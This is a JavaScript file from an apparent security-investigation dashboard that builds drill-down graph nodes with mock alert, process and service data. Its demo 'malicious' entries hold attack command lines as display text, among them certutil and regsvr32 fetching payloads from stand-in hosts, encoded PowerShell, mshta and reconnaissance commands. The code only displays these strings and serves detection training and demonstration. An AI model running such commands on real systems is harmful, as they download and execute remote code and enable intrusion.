/* graph-nodes.js — Dynamic node creation, cascading data, drill-down, collapse
 * Depends on: entities.js, display-config.js, graph-core.js, graph-summary.js, utils.js */
function generateCascadingData(category, label, parentEid, isMalicious, selfNodeId) {
  const parentEntity = ENTITIES[parentEid];
  const parentName = parentEntity ? parentEntity.modalTitle : parentEid;
  const self = selfNodeId || parentEid;
  const ts = '11 May 2026';

  const sections = {};

  if (category === 'service') {
    // ── Service node → can have related alerts, processes, and config
    const svcName = (label || 'Unknown Service').replace(/[^a-zA-Z0-9\s.-]/g, '');
    sections.recentAlerts = {
      label: 'Recent Alerts', expanded: false, viewAll: true,
      timeline: isMalicious ? [
        { time:`${ts}  15:36:55`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `aler-ctx-${self}-0`, label: 'Suspicious Service Install', icon:'🔔', sourceEntity: self },
          alertProfileId: 'alert-sus-service',
          detailsGrid: [
            { label:`15:36:55 Suspicious Service Install`, value:`${svcName} installed by non-admin`, tag:'Type', tagVal:'ANOMALY', source: parentName.split('·').pop()?.trim() || 'Unknown', status:'Open', severity:'High' }
          ] },
        { time:`${ts}  15:37:12`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `aler-ctx-${self}-1`, label: 'Outbound C2 Connection', icon:'🔔', sourceEntity: self },
          alertProfileId: 'alert-c2-conn',
          detailsGrid: [
            { label:`15:37:12 Outbound C2 Connection`, value:`${svcName} → External IP on port 443`, tag:'Type', tagVal:'THREAT', source: svcName, status:'Open', severity:'Critical' }
          ] }
      ] : [
        { time:`${ts}  14:30:00`, dot:'orange',
          viewOnGraph: { nodeId: `aler-ctx-${self}-0`, label: 'Service State Change', icon:'🔔', sourceEntity: self },
          detailsGrid: [
            { label:`14:30:00 Service State Change`, value:`${svcName} restarted unexpectedly`, tag:'Type', tagVal:'OPERATIONAL', source: svcName, status:'Closed', severity:'Medium' }
          ] }
      ]
    };
    sections.processes = {
      label: 'Processes Spawned', expanded: false, viewAll: true,
      timeline: isMalicious ? [
        { time:`${ts}  15:37:05`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `proc-ctx-${self}-0`, label: 'svchost_update.exe', icon:'⚙', sourceEntity: self },
          details: { 'Process Name':'svchost_update.exe', 'Parent Process': svcName, 'PID':'6142', 'Command Line':`${svcName}.exe -nop -exec bypass`, 'User':'NT AUTHORITY\\SYSTEM' } },
        { time:`${ts}  15:37:18`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `proc-ctx-${self}-1`, label: 'certutil.exe', icon:'⚙', sourceEntity: self },
          details: { 'Process Name':'certutil.exe', 'Parent Process': svcName, 'PID':'6201', 'Command Line':'certutil -urlcache -split -f http://staging-payload.net/update.dll', 'User':'NT AUTHORITY\\SYSTEM' } }
      ] : [
        { time:`${ts}  14:30:05`, dot:'green',
          viewOnGraph: { nodeId: `proc-ctx-${self}-0`, label: `${svcName}.exe`, icon:'⚙', sourceEntity: self },
          details: { 'Process Name': `${svcName}.exe`, 'Parent Process':'services.exe', 'PID':'2048', 'Command Line': `${svcName}.exe --start`, 'User':'NT AUTHORITY\\SYSTEM' } }
      ]
    };
    sections.serviceTriggered = {
      label: 'Dependent Services', expanded: false, viewAll: true,
      timeline: isMalicious ? [
        { time:`${ts}  15:37:30`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `serv-ctx-${self}-0`, label: 'CryptoSvc', icon:'🔧', sourceEntity: self },
          details: { 'Service Name':'CryptoSvc', 'Display name':'Cryptographic Services', 'Startup type':'Manual', 'host':'NT AUTHORITY\\SYSTEM', 'Status':'Started by ' + svcName, 'Severity':'High' } }
      ] : [
        { time:`${ts}  14:30:10`, dot:'green',
          viewOnGraph: { nodeId: `serv-ctx-${self}-0`, label: 'EventLog', icon:'🔧', sourceEntity: self },
          details: { 'Service Name':'EventLog', 'Display name':'Windows Event Log', 'Startup type':'Automatic', 'host':'Local Service', 'Status':'Running', 'Severity':'Normal' } }
      ]
    };
  }

  else if (category === 'process') {
    // ── Process node → can have child processes, services it touched, alerts
    const procName = (label || 'Unknown Process').replace(/[^a-zA-Z0-9\s.-]/g, '');
    // Use depth-aware child names to avoid label collisions with existing nodes
    const depth = (parentEid.match(/-ctx-/g) || []).length;
    const childProcs = isMalicious
      ? (depth < 1
        ? [{ name: 'cmd.exe', cmd: 'cmd.exe /c whoami /all > C:\\temp\\recon.txt', pid: '7320' },
           { name: 'net.exe', cmd: 'net user /domain', pid: '7456' }]
        : (depth < 2
          ? [{ name: 'powershell.exe', cmd: 'powershell -nop -ep bypass -enc <base64>', pid: '8010' },
             { name: 'wmic.exe', cmd: 'wmic process list brief', pid: '8120' }]
          : [{ name: 'mshta.exe', cmd: 'mshta vbscript:Execute("…")', pid: '9200' },
             { name: 'regsvr32.exe', cmd: 'regsvr32 /s /n /u /i:http://evil/shell.sct scrobj.dll', pid: '9310' }]
        ))
      : [{ name: 'conhost.exe', cmd: 'conhost.exe 0x4', pid: '3102' }];
    sections.recentAlerts = {
      label: 'Triggered Alerts', expanded: false, viewAll: true,
      timeline: isMalicious ? [
        { time:`${ts}  15:38:10`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `aler-ctx-${self}-0`, label: 'Encoded Command Execution', icon:'🔔', sourceEntity: self },
          alertProfileId: 'alert-enc-powershell',
          detailsGrid: [
            { label:`15:38:10 Encoded Command Execution`, value:`${procName} ran obfuscated payload`, tag:'Type', tagVal:'THREAT', mitre:'PowerShell (T1059.001)', source: procName, status:'Open', severity:'Critical' }
          ] },
        { time:`${ts}  15:38:22`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `aler-ctx-${self}-1`, label: 'Credential Dump Attempt', icon:'🔔', sourceEntity: self },
          alertProfileId: 'alert-sam-access',
          detailsGrid: [
            { label:`15:38:22 Credential Dump Attempt`, value:`${procName} accessed LSASS memory`, tag:'Type', tagVal:'THREAT', mitre:'LSASS Memory (T1003.001)', source: procName, status:'Open', severity:'Critical' }
          ] }
      ] : [
        { time:`${ts}  14:25:00`, dot:'green',
          viewOnGraph: { nodeId: `aler-ctx-${self}-0`, label: 'Normal Execution', icon:'⚙', sourceEntity: self },
          detailsGrid: [
            { label:`14:25:00 Normal Execution`, value:`${procName} completed normally`, tag:'Type', tagVal:'INFO', source: procName, status:'Closed', severity:'Low' }
          ] }
      ]
    };
    sections.processes = {
      label: 'Child Processes', expanded: false, viewAll: true,
      timeline: childProcs.map((cp, idx) => ({
        time: `${ts}  15:38:${String(5 + idx * 10).padStart(2, '0')}`,
        dot: isMalicious ? 'red' : 'green',
        malicious: isMalicious || undefined,
        viewOnGraph: { nodeId: `proc-ctx-${self}-${idx}`, label: cp.name, icon:'⚙', sourceEntity: self },
        details: { 'Process Name': cp.name, 'Parent Process': procName, 'PID': cp.pid, 'Command Line': cp.cmd, 'User': parentName.split('·').pop()?.trim() || 'SYSTEM' }
      }))
    };
    sections.serviceTriggered = {
      label: 'Services Invoked', expanded: false, viewAll: true,
      timeline: isMalicious ? [
        { time:`${ts}  15:38:20`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `serv-ctx-${self}-0`, label: 'WinRM', icon:'🔧', sourceEntity: self },
          details: { 'Service Name':'WinRM', 'Display name':'Windows Remote Management', 'Startup type':'Manual', 'host':'NT AUTHORITY\\NETWORK SERVICE', 'Status':'Started by ' + procName, 'Severity':'Critical' } },
        { time:`${ts}  15:38:25`, dot:'orange',
          viewOnGraph: { nodeId: `serv-ctx-${self}-1`, label: 'Task Scheduler', icon:'🔧', sourceEntity: self },
          details: { 'Service Name':'Schedule', 'Display name':'Task Scheduler', 'Startup type':'Automatic', 'host':'Local System', 'Status':'Task created by ' + procName, 'Severity':'High' } }
      ] : [
        { time:`${ts}  14:25:05`, dot:'green',
          viewOnGraph: { nodeId: `serv-ctx-${self}-0`, label: 'Print Spooler', icon:'🔧', sourceEntity: self },
          details: { 'Service Name':'Spooler', 'Display name':'Print Spooler', 'Startup type':'Automatic', 'host':'Local System', 'Status':'Running', 'Severity':'Normal' } }
      ]
    };
  }

  else if (category === 'alert') {
    // ── Alert node → can have related processes and services involved
    const alertName = (label || 'Unknown Alert').replace(/[^a-zA-Z0-9\s.-]/g, '');
    sections.processes = {
      label: 'Processes Involved', expanded: false, viewAll: true,
      timeline: isMalicious ? [
        { time:`${ts}  15:39:01`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `proc-ctx-${self}-0`, label: 'powershell.exe', icon:'⚙', sourceEntity: self },
          details: { 'Process Name':'powershell.exe', 'Parent Process':'cmd.exe', 'PID':'8120', 'Command Line':'powershell -ep bypass -f C:\\temp\\beacon.ps1', 'User':'m.henderson' } },
        { time:`${ts}  15:39:10`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `proc-ctx-${self}-1`, label: 'rundll32.exe', icon:'⚙', sourceEntity: self },
          details: { 'Process Name':'rundll32.exe', 'Parent Process':'powershell.exe', 'PID':'8244', 'Command Line':'rundll32.exe svchost_update.dll,DllMain', 'User':'SYSTEM' } }
      ] : [
        { time:`${ts}  14:20:00`, dot:'green',
          viewOnGraph: { nodeId: `proc-ctx-${self}-0`, label: 'svchost.exe', icon:'⚙', sourceEntity: self },
          details: { 'Process Name':'svchost.exe', 'Parent Process':'services.exe', 'PID':'1200', 'Command Line':'svchost.exe -k netsvcs', 'User':'SYSTEM' } }
      ]
    };
    sections.serviceTriggered = {
      label: 'Services Affected', expanded: false, viewAll: true,
      timeline: isMalicious ? [
        { time:`${ts}  15:39:15`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `serv-ctx-${self}-0`, label: 'WinDefend', icon:'🔧', sourceEntity: self },
          details: { 'Service Name':'WinDefend', 'Display name':'Windows Defender', 'Startup type':'Automatic', 'host':'Local System', 'Status':'Stopped (tampered)', 'Severity':'Critical' } }
      ] : [
        { time:`${ts}  14:20:05`, dot:'green',
          viewOnGraph: { nodeId: `serv-ctx-${self}-0`, label: 'EventLog', icon:'🔧', sourceEntity: self },
          details: { 'Service Name':'EventLog', 'Display name':'Windows Event Log', 'Startup type':'Automatic', 'host':'Local Service', 'Status':'Running', 'Severity':'Normal' } }
      ]
    };
    sections.recentAlerts = {
      label: 'Correlated Alerts', expanded: false, viewAll: true,
      timeline: isMalicious ? [
        { time:`${ts}  15:39:30`, dot:'red', malicious: true,
          viewOnGraph: { nodeId: `aler-ctx-${self}-0`, label: 'Lateral Movement', icon:'🔔', sourceEntity: self },
          alertProfileId: 'alert-impossible-travel',
          detailsGrid: [
            { label:`15:39:30 Lateral Movement Attempt`, value:`RDP to DC-01 from compromised host`, tag:'Type', tagVal:'CORRELATION', mitre:'Remote Desktop Protocol (T1021.001)', source: 'CORP-WS-045', status:'Open', severity:'Critical' }
          ] }
      ] : []
    };
  }

  return sections;
}

/* ── Helper: branch child nodes from entity data ─────────────── */
function branchChildNodes(parentEid, category, entries, edgeLabel, iconChar, colorConfig) {
  const svg = document.getElementById('graphSvg');
  const ns = 'http://www.w3.org/2000/svg';
  const srcCircle = document.querySelector(`#graphSvg g.graph-node[data-entity="${parentEid}"] circle:not(.expand-indicator)`);
  if (!srcCircle || !svg) return;
  const pCx = parseFloat(srcCircle.getAttribute('cx'));
  const pCy = parseFloat(srcCircle.getAttribute('cy'));
  const firstG = svg.querySelector('g.graph-node');

  if (!drillDownGroups[parentEid]) drillDownGroups[parentEid] = {};
  if (!drillDownGroups[parentEid][category]) drillDownGroups[parentEid][category] = [];

  // If already expanded (leaves shown) or grouped (count node shown), collapse fully (toggle off)
  if ((drillDownGroups[parentEid][category].length > 0) ||
      (groupHubs[parentEid] && groupHubs[parentEid][category])) {
    collapseGroupCategory(parentEid, category);
    return 'collapsed';
  }

  // Base angle per category to spread them in different directions
  const baseAngles = { alert: -Math.PI * 0.6, process: Math.PI * 0.2, service: Math.PI * 0.7, blast: -Math.PI * 0.15 };
  const baseAngle = baseAngles[category] || 0;
  let created = 0;

  // ── Group hub: one edge from the parent ends in a ✕ collapse hub; every
  //    leaf branches off the hub so the parent node stays uncluttered. ──
  const hub = createGroupHub(parentEid, pCx, pCy, category, baseAngle, edgeLabel, iconChar, colorConfig);
  const srcId = hub.hubId;
  const srcCx = hub.cx;
  const srcCy = hub.cy;
  if (!groupHubs[parentEid]) groupHubs[parentEid] = {};
  groupHubs[parentEid][category] = {
    hubId: hub.hubId, gEl: hub.gEl, edgeEl: hub.edgeEl, lblEl: hub.lblEl,
    cx: hub.cx, cy: hub.cy, entries, edgeLabel, iconChar, colorConfig, grouped: false
  };

  entries.forEach((entry, i) => {
    let label = entry.details?.[colorConfig.labelKey] || entry.details?.[colorConfig.altLabelKey] || entry.details?.['Alert'] || '';
    // Handle detailsGrid format (used by recent alerts). Keep the timestamp so
    // two distinct alerts that share a name (e.g. "LAN ARP Spoofing" at 09:43 and
    // 09:41) stay unique and both get their own node instead of being deduped.
    if (!label && entry.detailsGrid && entry.detailsGrid[0]) {
      const rawGrid = entry.detailsGrid[0].label;
      const tMatch = rawGrid.match(/^(\d{1,2}:\d{2})(?::\d{2})?\s*/);
      const baseName = rawGrid.replace(/^[\d:]+\s*/, '');
      label = tMatch ? `${baseName} (${tMatch[1]})` : baseName;
    }
    if (!label) label = category + ' ' + (i + 1);
    // Per-entry edge label (falls back to the category default) so paths like
    // blast-radius hops can show their own relation on each spoke.
    const eLabel = entry.edgeLabel || edgeLabel;
    // Per-entry icon (falls back to the category default) so blast-radius leaves
    // can each show an icon for their AD object type (group/computer/asset…).
    const iconForNode = entry.icon || iconChar;
    // Check by label if node already exists on graph
    const existing = findNodeByLabel(label);
    if (existing) {
      const existNodeId = existing.getAttribute('data-entity');
      if (!existNodeId) return;

      // Check if an edge already exists from this hub to that node
      const alreadyLinked = svg.querySelector('line[data-source="' + srcId + '"][data-target="' + existNodeId + '"]');
      if (alreadyLinked) {
        // Just pulse — already connected
        existing.style.transition = 'transform 0.3s ease';
        existing.style.transform = 'scale(1.3)';
        setTimeout(() => { existing.style.transform = 'scale(1)'; }, 500);
        return;
      }

      // Create a cross-edge from this parent to the existing node
      const existCircle = existing.querySelector('circle:not(.expand-indicator)');
      const tgtCx = existCircle ? parseFloat(existCircle.getAttribute('cx')) : 0;
      const tgtCy = existCircle ? parseFloat(existCircle.getAttribute('cy')) : 0;

      const isMal = !!entry.malicious;
      const crossEdge = document.createElementNS(ns, 'line');
      crossEdge.setAttribute('x1', srcCx); crossEdge.setAttribute('y1', srcCy);
      crossEdge.setAttribute('x2', tgtCx); crossEdge.setAttribute('y2', tgtCy);
      crossEdge.setAttribute('class', isMal ? 'graph-edge-mal' : 'graph-edge-norm');
      crossEdge.setAttribute('data-source', srcId);
      crossEdge.setAttribute('data-target', existNodeId);
      crossEdge.setAttribute('data-label', eLabel);
      crossEdge.setAttribute('stroke-dasharray', '6,3'); // dashed to indicate cross-link
      crossEdge.style.opacity = '0';
      if (firstG) svg.insertBefore(crossEdge, firstG); else svg.appendChild(crossEdge);

      const crossLbl = _branchRelBadge(
        ns, (srcCx + tgtCx) / 2, (srcCy + tgtCy) / 2, eLabel, srcId, existNodeId,
        isMal ? '#ef4444' : (colorConfig.normStroke || '#2C66DD')
      );
      crossLbl.style.opacity = '0';
      if (firstG) svg.insertBefore(crossLbl, firstG); else svg.appendChild(crossLbl);

      // Animate edge in
      requestAnimationFrame(() => {
        crossEdge.style.transition = 'opacity 0.4s ease';
        crossLbl.style.transition = 'opacity 0.4s ease 0.1s';
        crossEdge.style.opacity = '0.7'; crossLbl.style.opacity = '1';
      });

      // Track with gEl: null → collapse will only remove the edge, not the node
      drillDownGroups[parentEid][category].push({
        nodeId: existNodeId, gEl: null, edgeEl: crossEdge, lblEl: crossLbl, crossLink: true
      });

      // Pulse the existing node
      existing.style.transition = 'transform 0.3s ease';
      existing.style.transform = 'scale(1.3)';
      setTimeout(() => { existing.style.transform = 'scale(1)'; }, 500);
      return;
    }

    const nodeId = `${category.substring(0,4)}-ctx-${parentEid}-${i}`;
    if (document.querySelector(`#graphSvg g.graph-node[data-entity="${nodeId}"]`)) return;

    // Create dynamic ENTITIES entry so the child node shows its own details in the slider
    const isMal = !!entry.malicious;
    const parentEntity = ENTITIES[parentEid];
    const parentLabel = parentEntity ? parentEntity.modalTitle : parentEid;
    const ts = '11 May 2026';

    // Build rich sections based on category (matching static entity structure)
    const builtSections = {};

    if (category === 'process') {
      const procName = (label || 'Unknown').replace(/[^a-zA-Z0-9\s.\-_]/g, '');
      const pid = entry.details?.['PID'] || String(4000 + Math.floor(Math.random()*4000));
      const cmdLine = entry.details?.['Command Line'] || `${procName}`;
      const parentProc = entry.details?.['Parent Process'] || 'explorer.exe';
      const user = entry.details?.['User'] || 'm.henderson';
      builtSections.riskSummary = {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: isMal ? (70 + Math.floor(Math.random()*25)) : (10 + Math.floor(Math.random()*30)),
          maxScore: 100,
          severity: isMal ? 'Critical' : 'Low',
          statusBadge: isMal ? 'Suspicious Execution' : 'Normal Process',
          metrics: isMal ? [
            { icon:'⚠', label:'Anomaly Score', value:'High', color:'#dc2626' },
            { icon:'🔗', label:'Network Connections', value:'2', color:'#ea580c' },
            { icon:'📦', label:'Files Dropped', value:'1', color:'#dc2626' },
            { icon:'🔐', label:'Privilege Level', value:'Medium', color:'#d97706' },
            { icon:'🧬', label:'Obfuscation', value: cmdLine.includes('enc') ? 'Encoded' : 'None', color:'#ea580c' },
            { icon:'📊', label:'Child Processes', value:'2', color:'#d97706' }
          ] : [
            { icon:'✓', label:'Anomaly Score', value:'Low', color:'#16a34a' },
            { icon:'🔗', label:'Network Connections', value:'0', color:'#16a34a' },
            { icon:'📊', label:'Child Processes', value:'1', color:'#16a34a' }
          ],
          firstSeen: `${ts} 15:36:22`,
          lastActivity: `${ts} 15:37:01`,
          investigationStatus: isMal ? 'Active — Review recommended' : 'Normal — No action needed'
        }
      };
      builtSections.processDetails = {
        label: 'Process Details', expanded: true,
        kv: { 'Process Name': procName, 'PID': pid, 'Parent Process': parentProc, 'Command Line': cmdLine, 'User': `<a class="em-link" style="cursor:pointer;font-weight:600" onclick="openEntitySlider('${parentEid}')">${user}</a>`, 'Integrity Level': isMal ? 'Medium' : 'Low', 'Start Time': `${ts}  15:36:22`, 'Status': 'Running', 'Signature': isMal ? 'Unknown ⚠' : 'Microsoft (Valid)' }
      };
    } else if (category === 'service') {
      const svcName = (label || 'Unknown').replace(/[^a-zA-Z0-9\s.\-_]/g, '');
      const displayName = entry.details?.['Display name'] || svcName;
      const startupType = entry.details?.['Startup type'] || 'Automatic';
      const host = entry.details?.['host'] || 'NT AUTHORITY\\SYSTEM';
      builtSections.riskSummary = {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: isMal ? (65 + Math.floor(Math.random()*30)) : (5 + Math.floor(Math.random()*20)),
          maxScore: 100,
          severity: isMal ? 'High' : 'Low',
          statusBadge: isMal ? 'Suspicious Service' : 'Normal Service',
          metrics: isMal ? [
            { icon:'⚠', label:'Service Anomaly', value:'Detected', color:'#dc2626' },
            { icon:'🔧', label:'Startup Type', value: startupType, color:'#ea580c' },
            { icon:'🔗', label:'Dependent Services', value:'1', color:'#d97706' },
            { icon:'📊', label:'Processes Spawned', value:'2', color:'#dc2626' }
          ] : [
            { icon:'✓', label:'Service Status', value:'Normal', color:'#16a34a' },
            { icon:'🔧', label:'Startup Type', value: startupType, color:'#16a34a' },
            { icon:'📊', label:'Processes Spawned', value:'1', color:'#16a34a' }
          ],
          firstSeen: `${ts} 14:30:00`,
          lastActivity: `${ts} 15:37:30`,
          investigationStatus: isMal ? 'Active — Stop service recommended' : 'Normal — No action needed'
        }
      };
      builtSections.serviceDetails = {
        label: 'Service Details', expanded: true,
        kv: { 'Service Name': svcName, 'Display Name': displayName, 'Startup Type': startupType, 'Run As': host, 'Status': isMal ? 'Running ⚠' : 'Running', 'Binary Path': isMal ? `C:\\Windows\\Temp\\${svcName.toLowerCase()}.exe ⚠` : `C:\\Windows\\System32\\${svcName.toLowerCase()}.exe`, 'Parent Entity': `<a class="em-link" style="cursor:pointer;font-weight:600" onclick="openEntitySlider('${parentEid}')">${parentLabel.split('·').pop()?.trim() || parentEid}</a>` }
      };
    } else if (category === 'alert') {
      const alertName = (label || 'Unknown').replace(/[^a-zA-Z0-9\s.\-_]/g, '');
      const severity = entry.detailsGrid?.[0]?.severity || (isMal ? 'Critical' : 'Low');
      const mitre = entry.detailsGrid?.[0]?.mitre || 'N/A';
      const source = entry.detailsGrid?.[0]?.source || 'CORP-WS-045';
      builtSections.riskSummary = {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: isMal ? (75 + Math.floor(Math.random()*20)) : (15 + Math.floor(Math.random()*25)),
          maxScore: 100,
          severity: severity,
          statusBadge: isMal ? 'Active Alert' : 'Informational',
          metrics: isMal ? [
            { icon:'⚠', label:'Severity', value: severity, color:'#dc2626' },
            { icon:'🎯', label:'MITRE', value: mitre.split(' ')[0] || 'N/A', color:'#ea580c' },
            { icon:'🖥', label:'Source', value: source, color:'#d97706' },
            { icon:'🔗', label:'Correlated Alerts', value:'1', color:'#dc2626' }
          ] : [
            { icon:'✓', label:'Severity', value: severity, color:'#16a34a' },
            { icon:'🖥', label:'Source', value: source, color:'#16a34a' }
          ],
          firstSeen: `${ts} 15:38:00`,
          lastActivity: `${ts} 15:39:30`,
          investigationStatus: isMal ? 'Open — Needs triage' : 'Closed — Auto-resolved'
        }
      };
      builtSections.alertDetails = {
        label: 'Alert Details', expanded: true,
        kv: { 'Alert Name': alertName, 'Severity': severity, 'MITRE ATT&CK': mitre, 'Source': source, 'Status': isMal ? 'Open' : 'Closed', 'First Triggered': `${ts}  15:38:00`, 'Parent Entity': `<a class="em-link" style="cursor:pointer;font-weight:600" onclick="openEntitySlider('${parentEid}')">${parentLabel.split('·').pop()?.trim() || parentEid}</a>` }
      };
    }

    // Build the entity with rich sections first, then the raw details, then cascading
    ENTITIES[nodeId] = {
      type: category,
      modalTitle: category === 'process' ? `Process Details · ${label}` : category === 'service' ? `Service Details · ${label}` : category === 'alert' ? `Alert Details · ${label}` : category === 'blast' ? `Attack Path · ${label}` : category === 'blastmember' ? `AD Object · ${label}` : `${label}`,
      sections: {
        ...builtSections,
        details: {
          label: category.charAt(0).toUpperCase() + category.slice(1) + ' Raw Data',
          expanded: false,
          kv: entry.details || {}
        }
      }
    };
    if (entry.detailsGrid && entry.detailsGrid.length) {
      ENTITIES[nodeId].sections.detailsGrid = {
        label: 'Detailed Info',
        expanded: true,
        timeline: [{ time: entry.time || '', dot: entry.dot || 'amber', details: {}, detailsGrid: entry.detailsGrid }]
      };
    }

    // Allow callers (e.g. blast radius) to attach extra sections + top-level
    // entity data (such as _blastMembers used for member expansion).
    if (entry.extraSections) {
      Object.assign(ENTITIES[nodeId].sections, entry.extraSections);
    }
    if (entry.entityExtra) {
      Object.assign(ENTITIES[nodeId], entry.entityExtra);
    }

    // Inject cascading investigation data so this node can be further expanded
    const cascading = generateCascadingData(category, label, parentEid, isMal, nodeId);
    if (cascading) {
      Object.assign(ENTITIES[nodeId].sections, cascading);
    }

    const pos = findFreePosition(srcCx, srcCy, i, entries.length, baseAngle);
    const cx = pos.cx, cy = pos.cy;

    // Edge
    const edge = document.createElementNS(ns, 'line');
    edge.setAttribute('x1', srcCx); edge.setAttribute('y1', srcCy);
    edge.setAttribute('x2', cx); edge.setAttribute('y2', cy);
    edge.setAttribute('class', isMal ? 'graph-edge-mal' : 'graph-edge-norm');
    edge.setAttribute('data-source', srcId);
    edge.setAttribute('data-target', nodeId);
    edge.setAttribute('data-label', eLabel);
    edge.style.opacity = '0';
    if (firstG) svg.insertBefore(edge, firstG); else svg.appendChild(edge);

    // Register display info for popup lookup
    if (!ENTITY_DISPLAY[nodeId]) {
      const typeIcon = { alert:'🔔', process:'⚙', service:'🔧' };
      const typeColor = { alert:'#ef4444', process:'#d97706', service:'#0891b2' };
      const typeBg = { alert:'#fef2f2', process:'#fffbeb', service:'#ecfeff' };
      ENTITY_DISPLAY[nodeId] = {
        icon: typeIcon[category] || iconForNode,
        name: label.length > 20 ? label.substring(0, 18) + '…' : label,
        color: isMal ? (colorConfig.malStroke || '#ef4444') : (typeColor[category] || '#555'),
        bg: isMal ? '#fef2f2' : (typeBg[category] || '#f5f7fa')
      };
    }

    // Edge relation badge — clickable icon (matches main graph edge-info-btn)
    const edgeLblEl = _branchRelBadge(
      ns, (srcCx + cx) / 2, (srcCy + cy) / 2, eLabel, srcId, nodeId,
      isMal ? '#ef4444' : (colorConfig.normStroke || '#2C66DD')
    );
    edgeLblEl.style.opacity = '0';
    if (firstG) svg.insertBefore(edgeLblEl, firstG); else svg.appendChild(edgeLblEl);

    // Node group
    const g = document.createElementNS(ns, 'g');
    g.setAttribute('class', 'graph-node'); g.setAttribute('data-entity', nodeId);
    // Track investigation depth for visual chain analysis
    const parentDepth = parseInt(document.querySelector(`#graphSvg g.graph-node[data-entity="${parentEid}"]`)?.getAttribute('data-depth') || '0');
    g.setAttribute('data-depth', parentDepth + 1);
    g.setAttribute('onclick', `openEntitySlider('${nodeId}')`);
    g.setAttribute('oncontextmenu', `showGraphCtx(event,'${nodeId}')`);

    const circle = document.createElementNS(ns, 'circle');
    circle.setAttribute('cx', cx); circle.setAttribute('cy', cy);
    circle.setAttribute('r', '16'); circle.setAttribute('fill', '#ffffff');
    circle.setAttribute('stroke', isMal ? colorConfig.malStroke : colorConfig.normStroke);
    circle.setAttribute('stroke-width', '2');
    if (isMal) circle.setAttribute('filter', 'url(#glow-r)');

    // Add expandable indicator ring (shows this node can be drilled deeper)
    let hasCascade;
    if (category === 'blast') {
      hasCascade = !!(entry.entityExtra && entry.entityExtra._blastMembers && entry.entityExtra._blastMembers.length);
    } else if (category === 'blastmember') {
      hasCascade = false; // path members are leaves
    } else {
      hasCascade = entry.malicious || category !== 'alert'; // most nodes have cascading data
    }
    if (hasCascade) {
      const expandRing = document.createElementNS(ns, 'circle');
      expandRing.setAttribute('cx', cx + 12); expandRing.setAttribute('cy', cy - 12);
      expandRing.setAttribute('r', '5'); expandRing.setAttribute('fill', '#ffffff');
      expandRing.setAttribute('stroke', '#8a94a6'); expandRing.setAttribute('stroke-width', '1');
      expandRing.setAttribute('class', 'expand-indicator');
      g.appendChild(expandRing);
      const expandPlus = document.createElementNS(ns, 'text');
      expandPlus.setAttribute('x', cx + 12); expandPlus.setAttribute('y', cy - 12);
      expandPlus.setAttribute('text-anchor', 'middle'); expandPlus.setAttribute('font-size', '8');
      expandPlus.setAttribute('dominant-baseline', 'central');
      expandPlus.setAttribute('fill', '#8a94a6'); expandPlus.setAttribute('font-weight', '700');
      expandPlus.setAttribute('class', 'expand-indicator');
      expandPlus.textContent = '+';
      g.appendChild(expandPlus);
    }

    const iconEl = document.createElementNS(ns, 'text');
    iconEl.setAttribute('x', cx); iconEl.setAttribute('y', cy + 4);
    iconEl.setAttribute('text-anchor', 'middle'); iconEl.setAttribute('font-size', '12');
    iconEl.setAttribute('dominant-baseline', 'central');
    iconEl.textContent = iconForNode;

    const lblEl = document.createElementNS(ns, 'text');
    lblEl.setAttribute('x', cx); lblEl.setAttribute('y', cy + 26);
    lblEl.setAttribute('text-anchor', 'middle'); lblEl.setAttribute('font-size', '8.5');
    lblEl.setAttribute('fill', isMal ? colorConfig.malText : colorConfig.normText);
    lblEl.setAttribute('font-family', 'Lato,sans-serif');
    lblEl.setAttribute('font-weight', '600');
    const dispLabel = label.length > 20 ? label.substring(0, 18) + '…' : label;
    lblEl.textContent = dispLabel;

    g.appendChild(circle); g.appendChild(iconEl); g.appendChild(lblEl);
    svg.appendChild(g);

    // Make the branched node draggable
    makeNodeDraggable(g, circle, iconEl, lblEl, nodeId);

    // Register for dedup
    registerNode(nodeId, label);

    // Track for collapse
    drillDownGroups[parentEid][category].push({ nodeId, gEl: g, edgeEl: edge, lblEl: edgeLblEl });

    // Animate
    g.style.opacity = '0';
    requestAnimationFrame(() => {
      g.style.transition = 'opacity 0.4s ease ' + (i * 0.12) + 's';
      edge.style.transition = 'opacity 0.4s ease ' + (i * 0.12 + 0.08) + 's';
      edgeLblEl.style.transition = 'opacity 0.4s ease ' + (i * 0.12 + 0.12) + 's';
      g.style.opacity = '1'; edge.style.opacity = '0.7'; edgeLblEl.style.opacity = '1';
    });
    created++;
  });

  return created;
}

/* ── Group hub: a single edge from the parent ends in a ✕ collapse hub;
      leaves branch off the hub. Returns refs so the caller can track it. ── */
function createGroupHub(parentEid, pCx, pCy, category, baseAngle, edgeLabel, iconChar, colorConfig) {
  const svg = document.getElementById('graphSvg');
  const ns = 'http://www.w3.org/2000/svg';
  const firstG = svg.querySelector('g.graph-node');
  const hubId = `grp-${category}-${parentEid}`;
  const D = 110;
  const cx = Math.round(pCx + Math.cos(baseAngle) * D);
  const cy = Math.round(pCy + Math.sin(baseAngle) * D);
  const stroke = colorConfig.normStroke || '#8a94a6';

  // parent → hub edge + label
  const edge = document.createElementNS(ns, 'line');
  edge.setAttribute('x1', pCx); edge.setAttribute('y1', pCy);
  edge.setAttribute('x2', cx); edge.setAttribute('y2', cy);
  edge.setAttribute('class', 'graph-edge-norm');
  edge.setAttribute('data-source', parentEid);
  edge.setAttribute('data-target', hubId);
  edge.setAttribute('data-label', edgeLabel);
  edge.style.opacity = '0';
  if (firstG) svg.insertBefore(edge, firstG); else svg.appendChild(edge);

  // No relation badge on the parent→hub edge — relations are shown only on the
  // hub→spoke edges. The parent→hub edge just carries the group into the hub.
  const lbl = null;

  // hub node group (clicking it groups the leaves)
  const g = document.createElementNS(ns, 'g');
  g.setAttribute('class', 'graph-node graph-group-hub');
  g.setAttribute('data-entity', hubId);
